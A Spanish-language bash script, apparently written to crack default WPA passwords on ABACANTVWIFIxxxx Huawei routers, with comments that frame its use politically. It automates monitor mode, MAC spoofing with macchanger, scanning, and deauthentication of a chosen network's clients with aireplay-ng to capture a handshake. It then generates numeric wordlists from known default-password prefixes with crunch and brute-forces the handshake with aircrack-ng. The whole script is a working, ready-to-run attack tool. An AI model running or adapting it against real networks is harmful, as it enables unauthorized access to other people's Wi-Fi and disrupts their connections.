#!/bin/bash
# Este script hace uso de las contraseñas
# por defecto en los routers ABACANTVWIFIxxxx Huawei Inc.
# Escrito por @NyxZ3n, me hago responsable del uso del mismo
# Pues ante la dictadura, yo también soy responsable de hacer
# un cambio por el país. NO A LA DESINFORMACIÓN, 
# DEBEMOS ESTAR COMUNICADOS SIEMPRE.


# CharsetDiccionario = 85047928%%%%%% ó 8504792%%%%%%%



echo "¡ADVERTENCIA! Necesitas ser usuario root(superusuario) para correr el script"
sleep 3

HANDSHAKE="/root/Handshakes/HandShake.cap"

clear
echo "------------------------------------------------"
echo "                Script by @NyxZ3n               "
echo "                                                "
echo "   BruteForce a contraseñas predeterminadas en  "
echo "   routers ABACANTVWIFIxxxx                     "
echo "------------------------------------------------"
echo ""
echo "========Presiona enter para continuar========"
read EMPEZAR
if [[ $EMPEZAR == "" ]]; then
clear
fi

echo "----------------------------------------------------"
echo "-Empezar modo monitor en la interfaz wireless[s/n]?-"
echo "----------------------------------------------------"
echo ""
read MONIF

if [[ $MONIF == 's' ]]; then
echo ""
echo "Terminando procesos que pudiesen interferir"
echo ""
echo ""
sudo service networking stop
sudo service network-manager stop
iwconfig
echo ""
echo "Selecciona tarjeta wireless impresa arriba:"
echo ""
read WIRELESS
[[ $WIRELESS == "" ]]
clear
echo "Empezando modo monitor con $WIRELESS..."
sudo ifconfig $WIRELESS down
sudo iwconfig $WIRELESS mode monitor
sudo ifconfig $WIRELESS up
sleep 2
clear
else
echo ""
echo "NO A LA DESINFORMACIÓN/DESCOMUNICACIÓN."
sleep 2
clear
fi

echo "----------------------------------------"
echo "-    Desea hacer MAC Spoofing [s/n]?   -"
echo "----------------------------------------"
echo ""
read MACSPF

if [[ $MACSPF == 's' ]]; then
echo ""
echo "Apagando interfaces Wireless"
echo ""
sleep 2
sudo ifconfig $WIRELESS down
echo "Cambiando a MAC randomizada"
echo ""
sudo macchanger -r $WIRELESS 
echo ""
echo "Levantando interfaz Spoofeada"
echo ""
sleep 2
clear
sudo ifconfig $WIRELESS up
else
echo ""
echo "Ignorando"
sleep 1
clear
fi


echo "----------------------------------------------------------------"
echo "-  Verificar routers en el perimetro[s/n]? (n Si ya realizado) -"
echo "----------------------------------------------------------------"
echo ""
read DUMP
if [[ $DUMP == 's' ]]; then
echo ""
echo "Escaneando redes [Ctrl-C para Detener]"
echo ""
sleep 3
sudo airodump-ng $WIRELESS
else
sleep 2
clear
fi

while true
do
clear
echo "---------------------------------------------------------"
echo "-       Capturar el Handshake[s/n]? (n Si ya realizado) -"
echo "---------------------------------------------------------"
echo ""
read HANDC

if [[ $HANDC == 's' ]]; then
echo ""
echo "Creando directorio con Handshakes..."
echo ""
sleep 4
sudo mkdir /root/Handshakes &> /dev/null
echo "Directorio creado: /root/Handshakes"
echo ""
echo "Ingrese BSSID de la red (EJ: A1:F3:45:12:34:90):  "
echo ""
read BSSID
[[ $BSSID == "" ]]
echo ""
echo "Ingrese el channel de la red [1-14]:"
echo ""
read CHNEL
[[ $CHNEL == "" ]]
echo ""
echo "-------------------------------------------------------------"
echo "-Tiempo establecido de 60 segundos para captura de handshake-"
echo "-------------------------------------------------------------"
sleep 5
clear
sudo timeout 60s airodump-ng --ig --manufacturer -w /root/Handshakes/HandShake -c $CHNEL --bssid $BSSID $WIRELESS & timeout 55s xterm -hold -e "while true; do sleep 5; sudo aireplay-ng -0 5 -q 2 --ig -a $BSSID $WIRELESS; done" & sleep 61; kill $!
echo ""
echo ""
echo ""
echo "Presiona enter."
clear
echo ""
sudo mv /root/Handshakes/HandShake*.cap /root/Handshakes/HandShake.cap
clear
else
sleep 1
clear
fi

echo "-----------------------------------------------------------------------"
echo "-                     Handshake Capturado[s/n]?                       -"
echo "-----------------------------------------------------------------------"
read SI
if [[ $SI == 's' ]]; then
clear
echo ""
sleep 2
break
fi

done
echo "-----------------------------------------------------------------------"
echo "-    Desea devolver la interfaz $WIRELESS a su modo normal[s/n]?-      "
echo "-----------------------------------------------------------------------"
echo ""
read RESTOR

if [[ $RESTOR == "s" ]]; then
echo ""
echo "Desactivando modo monitor"
sudo ifconfig $WIRELESS down
sudo iwconfig $WIRELESS mode managed
echo "Apagando interfaz"
echo ""
echo "Restaurando MAC original"
echo ""
sleep 1
sudo macchanger -p $WIRELESS
echo ""
echo "Levantando interfaz $WIRELESS"
echo ""
sleep 1
sudo ifconfig $WIRELESS up
echo "Interfaz $WIRELESS restaurada"
echo ""
echo "Devolviendo Network manager y networking"
sudo service network-manager start
sudo service networking start
clear
else
echo ""
echo "NO A LA DESINFORMACIÓN/DESCOMUNICACIÓN"
sleep 1
clear
fi

while true
do
clear
echo "*****************************************************"
echo "****************Selecciona una opción****************"
echo "*****************************************************"
echo "**                                                 **"
echo "** 1. Ver handshakes             (Ctrl-C to exit)  **"
echo "** 2. charset:85047928xxxxxx     (10 minutos aprox)**"
echo "** 3. charset:8504792xxxxxxx     (1hora aprox)     **"
echo "**                                                 **"
echo "*****************************************************"
echo "*****************************************************"
echo "*****************************************************"
echo ""

read n
case $n in
1)(xterm -hold -e sudo aircrack-ng $HANDSHAKE) & ;;

2)clear
echo "Empezando fuerzabruta de 6 dígitos numéricos."
echo ""
echo "Por favor ingrese un nombre para el diccionario:"
echo ""
read DICCIONARIO
[[DICCIONARIO == ""]]
echo ""
crunch 14 14 -t 85047928%%%%%% -o $DICCIONARIO
echo ""
sudo aircrack-ng -w $DICCIONARIO $HANDSHAKE
echo ""
read -p "Presione cualquier tecla para volver.";;

3)clear
echo "Empezando fuerzabruta de 7 dígitos numéricos."
echo ""
echo "Por favor ingrese un nombre para el diccionario:"
echo ""
read DICCIONARIO2
[[DICCIONARIO2 == ""]]
echo ""
crunch 14 14 -t 8504792%%%%%%% -o $DICCIONARIO2
echo""
sudo aircrack-ng -w $DICCIONARIO2 $HANDSHAKE
echo ""
read -p "Presione cualquier tecla para volver.";;



*)clear
echo "Invalid option"
echo ""
read -p "Presione cualquier tecla para volver.";;

esac
sleep 1
done
